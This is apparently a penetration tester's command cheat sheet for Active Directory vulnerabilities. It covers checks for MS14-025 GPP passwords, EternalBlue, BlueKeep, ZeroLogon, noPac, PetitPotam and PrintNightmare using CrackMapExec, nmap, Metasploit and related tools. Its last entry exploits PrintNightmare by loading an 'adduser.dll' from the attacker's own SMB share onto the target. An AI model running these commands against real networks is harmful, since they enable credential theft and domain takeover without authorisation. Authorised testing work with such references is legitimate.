# CVE

## Check & Exploit GPP SYSVOL (MS14-025) - cme

```
cme smb <domain-controller> -u <user> -p '<password>' -d <domain> -M gpp_password
```

= domain-controller: $DC
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## Check & Exloit GPP SYSVOL (MS14-025) - msf

```
msfconsole -x "use scanner/smb/smb_enum_gpp"
```

## Check SMB vulnerabilities

```
nmap -Pn --script smb-vuln* -p139,445 <target>
```

= target: ./targets/domain/computers.txt

## Check Eternal Blue (MS17-010) - cme

```
cme smb <target> -M ms17
```

= target: ./targets/domain/computers.txt

## Check BlueKeep (CVE-2019-0708)

```
rdpscan <target>
```

= target: ./targets/domain/computers.txt

## Check Eternal Blue (MS17-010) - nmap

```
nmap -Pn --script smb-vuln-ms17-010 -p139,445 <target>
```

= target: ./targets/domain/computers.txt

## Check Zero Logon (CVE-2020-1472)

```
cme smb <domain-controller> -M zerologon
```

= domain-controller: $DC

## Check noPac (CVE-2021-42278 and CVE-2021-42287)

```
cme smb <domain-controller> -u <user> -p '<password>' -d <domain> -M nopac
```

= domain-controller: DOMAIN_CONTROLLER
= user: ${USER}
= password: ${PASSWORD}
= domain: ${DOMAIN}

## Check PetitPotam (CVE-2021-36942)

```
cme smb <domain-controller> -u <user> -p '<password>' -d <domain> -M petitpotam
```

= domain-controller: $DC
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## Check Print Nightmare with Docker (CVE-2021-34527)

```
docker run -v "<target>:/target.txt"-it itwasalladream -u <user> -p '<password>' -d <domain> target.txt
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= target: $PWD/ad_computers.txt

## Check Print Nightmare with local install (CVE-2021-34527)

```
itwasalladream -u <user> -p '<password>' -d <domain> target.txt
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= target: $PWD/ad_computers.txt

## Exploit Print Nightmare (CVE-2021-34527)

```
CVE-2021-1675 <domain>/<user>:<password>@<target> '\\<my_ip>\public\adduser.dll'
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
